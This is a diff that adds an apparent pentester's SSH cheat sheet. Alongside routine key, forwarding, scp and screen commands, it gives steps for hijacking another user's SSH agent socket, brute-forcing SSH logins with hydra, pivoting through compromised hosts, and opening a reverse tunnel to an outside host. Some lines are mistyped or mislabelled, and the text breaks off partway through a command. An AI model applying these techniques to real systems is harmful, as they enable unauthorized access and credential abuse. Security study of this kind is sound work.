@@ -1,0 +1,98 @@
+SSH
+
+ssh -D 127.0.0.1:1080 10.0.0.1
+~/.ssh/config
+/etc/ssh/ssh_config
+~/.ssh/authozied_keys
+~/.ssh/known_hosts
+
+ssh-keygen -f mykey
+ssh-add ~/dir/mykey
+
+
+generate private key for public key in deb/ubu 2006-2008
+	ssh-keygen -l -f publickey.pub
+	ssh -i /path/to/privkey
+	
+>tsocks rdesktop 10.0.0.2
+>**torsocks
+	-set up tsocks for pivoting over ssh-connected host connection
+	
+ssh -L 127.0.0.1:10521:127.0.0.1:1521 user@10.0.0.1
+	-service running on the remote host on TCP port 1521 is accessible by connecting to 10521 on the SSH client system
+OR
+in ~/.ssh/config
+LocalForward 127.0.0.1:10521 10.0.0.99:1521
+
+ssh -R 127.0.0.1:8000:127.0.0.1:80 10.0.0.1
+OR
+in ~/.ssh/config
+RemoteForward 127.0.0.1:8000 127.0.0.1:80
+
+X11 Forwarding
+SSH -X 10.0.0.1
+OR
+in ~/.ssh/config
+ForwardX11 yes
+
+
+SSH Agent hijacking
+export  SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473
+ssh-add -l # lists the keys loaded into the agent
+ssh user@host # will authenticate you if server trusts key in agent
+	-SSH agents listen on a unix socket, must figure where this is for each agent (e.g. /tmp/ssh-tqiEl28473/agent.28473)
+OR
+ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '
+
+nmap -p 22 -v -sV --script=ssh-hostkey 10.11.1.71
+ssh root@127.0.0.1
+
+
+
+USING SSH
+ssh-keygen -t rsa -C newserver -f ~/.ssh/id_rsa
+	-generate new rsa key
+ssh-keygen -lvf  id_rsa
+	-retrieve fingerprint of ssh key
+ssh-keygen -lvf ~/.ssh/known_hosts
+	-retrieve all ssh fingerprints
+ssh user@remotehost "`cat filename.txt`"
+	-execute a list of commands over ssh non-interactively
+ssh-copy-id -i .ssh/id_rsa.pub user@192.168.1.100
+	-copy public key to a remote host(checks to not copy private key by default)
+
+	
+USE SCREEN
+screen -S testscreen
+	ctrl+a+d to disconnect from screen
+screen -ls
+ssh -t user@192.168.1.168 screen -r testscreen
+ssh -t user@192.168.1.168 /usr/bin/screen -xRR
+screen -D -r
+	connect to an existing screen session (-r) or create one if none exists (-D)
+
+	
+BRUTE force
+hydra 192.168.1.1 ssh -L userlist -P wordlist -s 22 -vV
+
+SCP
+remote->local
+scp your_username@remotehost.edu:foobar.txt /some/local/directory
+local->remote
+scp foobar.txt your_username@remotehost.edu:/some/remote/directory
+directoires remote->local
+scp foobar.txt your_username@remotehost.edu:/some/remote/directory
+directories local->remote
+scp -r foo your_username@remotehost.edu:/some/remote/directory/bar
+scp your_username@rh1.edu:/some/remote/directory/foobar.txt \
+your_username@rh2.edu:/some/remote/directory/
+cryptography
+scp -c blowfish -C local_file your_username@remotehost.edu:~
+	-using cipher blowfish instead of default Triple-DES encrpytion and throwing the -C compression flag may increase speed, the later may also reduce network footprint for large files
+
+	
+FORWARDING
+sshuttle --dns -vr user@yourserver.com 0/0 --ssh-cmd 'ssh -i /your/key/path.pem'
+sshuttle --dns -vr user@18.191.44.176 35.190.8.19 --ssh-cmd 'ssh -i /root/Dropbox/sentant/xyzpivot.pem'
+ssh -f -N -R 2222:127.0.0.1:22 admin@12.11.13.14
+ssh -f -N -D -p 8080 
